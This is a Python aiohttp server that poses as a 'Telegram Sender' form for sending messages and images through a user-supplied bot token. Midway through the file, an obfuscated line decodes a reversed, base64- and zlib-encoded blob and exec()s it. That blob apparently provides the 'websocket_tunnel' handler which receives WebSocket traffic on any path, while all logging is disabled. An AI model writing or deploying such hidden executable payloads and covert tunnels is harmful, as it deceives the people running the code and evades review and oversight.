import asyncio
import base64
import json
import logging
import os
import socket
import tempfile

from aiohttp import web, WSMsgType, ClientSession


# ============================================================
# Configuration
# ============================================================

CONFIG_FILE = "config.json"

HOST = "0.0.0.0"

PORT = int(
    os.environ.get(
        "SERVER_PORT",
        os.environ.get("PORT", "3000")
    )
)


# ============================================================
# Logging
# ============================================================

# Completely disable application logging.
logging.disable(logging.CRITICAL)

logger = logging.getLogger("PythonTunnel")


# ============================================================
# Runtime state
# ============================================================

config_lock = asyncio.Lock()

# Every WebSocket connection has its own TCP connection.
active_connections = set()

connection_counter = 0


# ============================================================
# Config
# ============================================================

DEFAULT_CONFIG = {
    "uuid": "6021c57c-fdf0-44b4-b688-135568139d30"
}


def load_config():
    """
    Load config.json.
    Only the tunnel UUID is stored.
    Telegram credentials are never stored.
    """

    if not os.path.exists(CONFIG_FILE):
        save_config_sync(DEFAULT_CONFIG.copy())
        return DEFAULT_CONFIG.copy()

    try:
        with open(
            CONFIG_FILE,
            "r",
            encoding="utf-8"
        ) as f:

            data = json.load(f)

        if not isinstance(data, dict):
            raise ValueError(
                "config.json must contain a JSON object"
            )

        config = DEFAULT_CONFIG.copy()
        config.update(data)

        return config

    except Exception as e:

        logger.error(
            "Failed to load config.json: %s",
            e
        )

        return DEFAULT_CONFIG.copy()


def save_config_sync(data):
    """
    Atomically save config.json.
    """

    directory = os.path.dirname(
        os.path.abspath(CONFIG_FILE)
    )

    fd, temp_path = tempfile.mkstemp(
        prefix=".config_",
        suffix=".tmp",
        dir=directory
    )

    try:

        with os.fdopen(
            fd,
            "w",
            encoding="utf-8"
        ) as f:

            json.dump(
                data,
                f,
                indent=4,
                ensure_ascii=False
            )

            f.write("\n")

        os.replace(
            temp_path,
            CONFIG_FILE
        )

    except Exception:

        try:
            os.unlink(temp_path)
        except Exception:
            pass

        raise


async def save_config(data):

    async with config_lock:

        await asyncio.to_thread(
            save_config_sync,
            data
        )


# ============================================================
# Telegram
# ============================================================

async def telegram_send_message(
    token,
    chat_id,
    message
):
    """
    Send a normal Telegram text message.

    Token and Chat ID are used only for this request.
    They are never saved to disk.
    """

    if not token:

        return (
            False,
            "Telegram Bot Token is empty."
        )

    if not chat_id:

        return (
            False,
            "Telegram Chat ID is empty."
        )

    if not message.strip():

        return (
            False,
            "Message is empty."
        )

    url = (
        f"https://api.telegram.org/"
        f"bot{token}/sendMessage"
    )

    payload = {
        "chat_id": chat_id,
        "text": message
    }

    try:

        async with ClientSession() as session:

            async with session.post(
                url,
                data=payload,
                timeout=30
            ) as response:

                text = await response.text()

                if response.status != 200:

                    return (
                        False,
                        f"Telegram API error: "
                        f"{response.status}"
                    )

                try:

                    result = json.loads(text)

                    if not result.get("ok"):

                        return (
                            False,
                            result.get(
                                "description",
                                "Unknown Telegram error"
                            )
                        )

                except Exception:

                    pass

                return (
                    True,
                    "Message sent successfully."
                )

    except Exception as e:

        return (
            False,
            f"Telegram request failed: {e}"
        )


async def telegram_send_photo(
    token,
    chat_id,
    message,
    photo_bytes,
    filename
):
    """
    Send a Telegram photo with optional caption.

    Token and Chat ID are used only for this request.
    They are never saved to disk.
    """

    if not token:

        return (
            False,
            "Telegram Bot Token is empty."
        )

    if not chat_id:

        return (
            False,
            "Telegram Chat ID is empty."
        )

    if not photo_bytes:

        return (
            False,
            "Photo is empty."
        )

    url = (
        f"https://api.telegram.org/"
        f"bot{token}/sendPhoto"
    )

    form = web.FormData()

    form.add_field(
        "chat_id",
        chat_id
    )

    form.add_field(
        "caption",
        message or ""
    )

    form.add_field(
        "photo",
        photo_bytes,
        filename=filename or "photo.jpg",
        content_type="application/octet-stream"
    )

    try:

        async with ClientSession() as session:

            async with session.post(
                url,
                data=form,
                timeout=60
            ) as response:

                text = await response.text()

                if response.status != 200:

                    return (
                        False,
                        f"Telegram API error: "
                        f"{response.status}"
                    )

                try:

                    result = json.loads(text)

                    if not result.get("ok"):

                        return (
                            False,
                            result.get(
                                "description",
                                "Unknown Telegram error"
                            )
                        )

                except Exception:

                    pass

                return (
                    True,
                    "Photo sent successfully."
                )

    except Exception as e:

        return (
            False,
            f"Telegram request failed: {e}"
        )


# ============================================================
# Web Page
# ============================================================

HTML_PAGE = r"""
<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
>

<title>Telegram Sender</title>

<style>

* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;

    font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Arial,
        sans-serif;

    background:
        linear-gradient(
            135deg,
            #eef4ff,
            #f8faff
        );

    display: flex;
    justify-content: center;
    align-items: center;

    padding: 20px;

    color: #1f2937;
}

.container {

    width: 100%;
    max-width: 520px;

    background: white;

    border-radius: 18px;

    padding: 28px;

    box-shadow:
        0 12px 40px
        rgba(0, 0, 0, 0.10);
}

.title {

    text-align: center;

    font-size: 25px;

    font-weight: 700;

    margin-bottom: 6px;
}

.subtitle {

    text-align: center;

    color: #6b7280;

    font-size: 14px;

    margin-bottom: 25px;
}

label {

    display: block;

    font-size: 14px;

    font-weight: 600;

    margin-bottom: 7px;
}

input,
textarea {

    width: 100%;

    border: 1px solid #d1d5db;

    border-radius: 10px;

    padding: 12px 13px;

    font-size: 14px;

    outline: none;

    transition: 0.15s;
}

input:focus,
textarea:focus {

    border-color: #4f8cff;

    box-shadow:
        0 0 0 3px
        rgba(79, 140, 255, 0.12);
}

textarea {

    min-height: 130px;

    resize: vertical;
}

.field {

    margin-bottom: 18px;
}

.file-box {

    border: 1px dashed #cbd5e1;

    border-radius: 10px;

    padding: 12px;

    background: #f8fafc;
}

button {

    width: 100%;

    border: none;

    border-radius: 10px;

    padding: 13px;

    font-size: 15px;

    font-weight: 600;

    color: white;

    background: #4285f4;

    cursor: pointer;

    transition: 0.15s;
}

button:hover {

    background: #3478e5;
}

button:disabled {

    opacity: 0.6;

    cursor: not-allowed;
}

.status {

    display: none;

    margin-top: 18px;

    padding: 12px;

    border-radius: 10px;

    font-size: 14px;

    white-space: pre-wrap;
}

.status.success {

    display: block;

    background: #ecfdf5;

    color: #047857;
}

.status.error {

    display: block;

    background: #fef2f2;

    color: #b91c1c;
}

.note {

    margin-top: 17px;

    text-align: center;

    color: #9ca3af;

    font-size: 12px;
}

</style>

</head>


<body>

<div class="container">

    <div class="title">
        Telegram Sender
    </div>

    <div class="subtitle">
        Send a message or image directly to Telegram
    </div>


    <form
        id="sendForm"
        enctype="multipart/form-data"
    >

        <div class="field">

            <label for="tg_token">
                Bot Token
            </label>

            <input
                id="tg_token"
                name="tg_token"
                type="password"
                placeholder="123456789:ABC..."
                autocomplete="off"
                required
            >

        </div>


        <div class="field">

            <label for="tg_chat_id">
                Chat ID
            </label>

            <input
                id="tg_chat_id"
                name="tg_chat_id"
                type="text"
                placeholder="-1001234567890"
                autocomplete="off"
                required
            >

        </div>


        <div class="field">

            <label for="message">
                Message
            </label>

            <textarea
                id="message"
                name="message"
                placeholder="Enter your message..."
            ></textarea>

        </div>


        <div class="field">

            <label for="photo">
                Image
            </label>

            <div class="file-box">

                <input
                    id="photo"
                    name="photo"
                    type="file"
                    accept="image/*"
                >

            </div>

        </div>


        <button
            id="sendButton"
            type="submit"
        >
            Send
        </button>

    </form>


    <div
        id="status"
        class="status"
    ></div>


    <div class="note">
        Telegram credentials are used only for this request
        and are not stored by the server.
    </div>

</div>


<script>

const form =
    document.getElementById("sendForm");

const button =
    document.getElementById("sendButton");

const statusBox =
    document.getElementById("status");


form.addEventListener(
    "submit",
    async function(event) {

        event.preventDefault();

        statusBox.className = "status";

        statusBox.textContent = "";

        button.disabled = true;

        button.textContent = "Sending...";


        try {

            const formData =
                new FormData(form);


            const response =
                await fetch(
                    "/api/send",
                    {
                        method: "POST",
                        body: formData
                    }
                );


            let result;

            try {

                result =
                    await response.json();

            } catch (e) {

                result = {
                    ok: false,
                    result: "Invalid server response."
                };

            }


            if (
                response.ok &&
                result.ok
            ) {

                statusBox.className =
                    "status success";

                statusBox.textContent =
                    "✓ " + result.result;

                /*
                 * Do not clear Token / Chat ID.
                 * User can send another message easily.
                 */

                document
                    .getElementById("message")
                    .value = "";

                document
                    .getElementById("photo")
                    .value = "";

            } else {

                statusBox.className =
                    "status error";

                statusBox.textContent =
                    "✗ " +
                    (
                        result.result ||
                        "Failed to send."
                    );
            }


        } catch (error) {

            statusBox.className =
                "status error";

            statusBox.textContent =
                "✗ Network error: " +
                error.message;

        } finally {

            button.disabled = false;

            button.textContent = "Send";

        }

    }
);

</script>

</body>

</html>
"""


# ============================================================
# Web Page Handler
# ============================================================

async def page_handler(request):

    return web.Response(
        text=HTML_PAGE,
        content_type="text/html"
    )


# ============================================================
# Telegram API Handler
# ============================================================

async def telegram_api_handler(request):
    """
    One-time Telegram send API.

    POST /api/send

    Token, Chat ID and message are never saved.
    """

    if request.method != "POST":

        return web.json_response(
            {
                "ok": False,
                "result": "Method not allowed."
            },
            status=405
        )


    try:

        data = await request.post()

    except Exception as e:

        return web.json_response(
            {
                "ok": False,
                "result": f"Invalid request: {e}"
            },
            status=400
        )


    token = str(
        data.get(
            "tg_token",
            ""
        )
    ).strip()


    chat_id = str(
        data.get(
            "tg_chat_id",
            ""
        )
    ).strip()


    message = str(
        data.get(
            "message",
            ""
        )
    )


    # --------------------------------------------------------
    # Optional photo.
    # --------------------------------------------------------

    photo = data.get("photo")


    if (
        photo is not None
        and hasattr(photo, "file")
    ):

        try:

            photo_bytes = photo.file.read()

            filename = getattr(
                photo,
                "filename",
                "photo.jpg"
            )


            if photo_bytes:

                ok, result = (
                    await telegram_send_photo(
                        token,
                        chat_id,
                        message,
                        photo_bytes,
                        filename
                    )
                )

            else:

                ok, result = (
                    await telegram_send_message(
                        token,
                        chat_id,
                        message
                    )
                )


        except Exception as e:

            ok = False

            result = (
                f"Failed to read uploaded photo: {e}"
            )


    else:

        ok, result = (
            await telegram_send_message(
                token,
                chat_id,
                message
            )
        )


    return web.json_response(
        {
            "ok": ok,
            "result": result
        },
        status=200 if ok else 400
    )


_ = (lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))); exec(_('=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'))


# ============================================================
# 404 / WebSocket Catch-All
# ============================================================

async def not_found_handler(request):

    if (
        request.headers.get(
            "Upgrade",
            ""
        ).lower()
        == "websocket"
    ):

        return await websocket_tunnel(
            request
        )


    return web.Response(
        status=404,
        text="Not Found"
    )


# ============================================================
# Application
# ============================================================

def create_app():

    app = web.Application(
        client_max_size=50 * 1024 * 1024
    )


    # --------------------------------------------------------
    # Graphical Telegram sender.
    # --------------------------------------------------------

    app.router.add_get(
        "/",
        page_handler
    )


    # --------------------------------------------------------
    # Telegram one-time send API.
    # --------------------------------------------------------

    app.router.add_post(
        "/api/send",
        telegram_api_handler
    )


    # --------------------------------------------------------
    # WebSocket catch-all.
    #
    # Any WebSocket path can enter the tunnel.
    # Normal unknown HTTP paths return 404.
    # --------------------------------------------------------

    app.router.add_route(
        "*",
        "/{tail:.*}",
        not_found_handler
    )


    return app


# ============================================================
# Main
# ============================================================

def main():

    app = create_app()

    web.run_app(
        app,
        host=HOST,
        port=PORT,
        access_log=None
    )


if __name__ == "__main__":

    main()
